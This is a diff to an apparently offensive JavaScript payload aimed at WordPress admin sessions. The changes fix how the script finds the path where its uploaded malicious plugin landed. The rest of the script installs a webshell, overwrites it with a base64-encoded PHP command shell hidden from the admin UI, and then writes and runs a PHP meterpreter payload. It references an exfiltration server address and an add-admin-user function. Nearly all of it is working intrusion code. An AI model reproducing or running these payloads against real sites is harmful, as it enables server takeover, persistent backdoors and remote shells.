@@ -26,6 +26,12 @@ var httpExfilServer = "http://192.168.78.135:8888";
 
 
 // This will hold the webshell locations
+// Note that different wordpress servers
+// will save these in different locations, 
+// we don't control the directory name.
+// The add plugin function will parse out 
+// the correct directory name and update
+// these variables as necessary. 
 var webShellPath    = "shell/shell.php";
 var phpMetShellPath = "shell/meterpreter.php";
 
@@ -292,8 +298,35 @@ function installYertleShell()
 
 			console.log("Done uploading malicious plugin");
 
-			// This is fun, you don't actually have to activate the yertle plugin
-			// to use it. 
+			// We need to know path to our shell, so we need to know where
+			// WordPress installed it. Let's parse the path
+			// out from the response since this isn't always
+			// what we expect...
+			uploadXhr.onreadystatechange = function()
+			{
+				if (uploadXhr.readyState == XMLHttpRequest.DONE)
+				{
+					var response   = read_body(uploadXhr);
+					var startIndex = response.indexOf('<p>Plugin installed successfully.</p>');
+					var endIndex   = response.indexOf('target="_parent">Activate Plugin</a>');
+					//console.log("Plugin path start index of: " + startIndex);
+					//console.log("Plugin path end index of: " + endIndex);
+					var pluginPath = response.substring(startIndex + 119, endIndex-26);
+					//console.log("Sample: " + pluginPath);
+
+					pluginPath = pluginPath.replace("%2F", "/");
+					//console.log("*** Fixed plugin path: " + pluginPath);
+					window.webShellPath = pluginPath;
+					//console.log("updated webShellPath is: " + webShellPath);
+					// Pull the directory name out so we can
+					// set the meterpreter directory
+					var pluginDir = pluginPath.split("/");
+					//console.log("Directory is: " + pluginDir[0]);
+					window.phpMetShellPath = pluginDir[0] + "/meterpreter.php";
+					//console.log ("updated met path is: " + phpMetShellPath);
+				}
+			} 
+
 			// You can now use the yertle script to interact with the server by 
 			// sending php code, assuming that's the plugin you added. That's
 			// what's in the zip file embedded in this javascript example
@@ -341,10 +374,6 @@ async function hideYertleShell()
 	// at the end of the file here
 	// You should probably test this on your own server thoroughly to 
 	// make sure it works as expected
-
-	var testUri = "/wp-content/plugins/" + webShellPath;
-
-
 	var payload =`<?php
     $command = $_GET["cmd"];
     $command = substr($command, 0, -1);
@@ -372,8 +401,6 @@ async function hideYertleShell()
 	var cmd = "php -r \'echo base64_decode(\"" + encodedPayload + "\");\' > shell.php\n";
 	var encodedCmd = btoa(cmd);
 
-	var uri = "/wp-content/plugins/" + webShellPath + "?cmd=" + encodedCmd;
-	var testUri = "/wp-content/plugins/" + webShellPath;
 
 	// Before we sent this, we first  need to make sure the wordpress
 	// server has finished installing the yertle plugin
@@ -381,6 +408,13 @@ async function hideYertleShell()
 	// to overwrite itself
 	while (true)
 	{
+		// this might get updated if the wordpress server
+		// ends up installing this someplace we didnt'
+		// expect. It's global, so if another async function
+		// updates it to the correct path, this should get
+		// updated and fall through correctly
+		var testUri = "/wp-content/plugins/" + webShellPath;
+
 		var xhr = new XMLHttpRequest();
 		xhr.open('GET', testUri, false);  
 		xhr.send(null);
@@ -392,12 +426,13 @@ async function hideYertleShell()
 		}
 		if (xhr.status == 404)
 		{
-			//console.log("Shell is still 404'ing...");
+			console.log("Shell isn't there yet...");
 			await sleep(5000);
 			continue;
 		}
 	}
 
+	var uri = "/wp-content/plugins/" + webShellPath + "?cmd=" + encodedCmd;
 
 	console.log("About to overwrite the shell.php to hide it in the UI...");
 	xhr = new XMLHttpRequest();
@@ -477,7 +512,6 @@ async function openPhpMeterpreterSession()
     var payload = btoa(metPhpCommand);
     var commandValue = "php -r \'echo base64_decode(\"" + payload + "\");\' > meterpreter.php\n";
     var encodedCommand = btoa(commandValue);
-    var uri = "/wp-content/plugins/" + webShellPath + "?cmd=" + encodedCommand;
 
 
     // We can't use the uploaded shell to write the meterpretery shell
@@ -503,7 +537,8 @@ async function openPhpMeterpreterSession()
 	}
 
     // Ok, let's upload our meterpreter php file...
-	xhr = new XMLHttpRequest();
+	var uri = "/wp-content/plugins/" + webShellPath + "?cmd=" + encodedCommand;
+    xhr = new XMLHttpRequest();
 	
 	xhr.open("GET", uri, true);
 	xhr.send(null);
@@ -515,14 +550,14 @@ async function openPhpMeterpreterSession()
 	// be there
 	await sleep(10000);
 
-	 console.log ("Sending command to execute shell...");
-     commandValue = "php meterpreter.php";
-     payload = btoa(commandValue);
+	console.log ("Sending command to execute shell...");
+    commandValue = "php meterpreter.php";
+    payload = btoa(commandValue);
 
-     var uri = "/wp-content/plugins/" + webShellPath + "?cmd=" + payload;
+    var uri = "/wp-content/plugins/" + webShellPath + "?cmd=" + payload;
 
-     xhr.open("GET", uri, true);
-	 xhr.send(null);
+    xhr.open("GET", uri, true);
+	xhr.send(null);
 
 	 // insert shell happy dance here
 }
@@ -595,7 +630,7 @@ function writeFile()
 
 // The user, password, permissions and such are defined in the function 
 // itself, make sure you adjust these values. 
-addAdminUser();
+//addAdminUser();
 
 
 
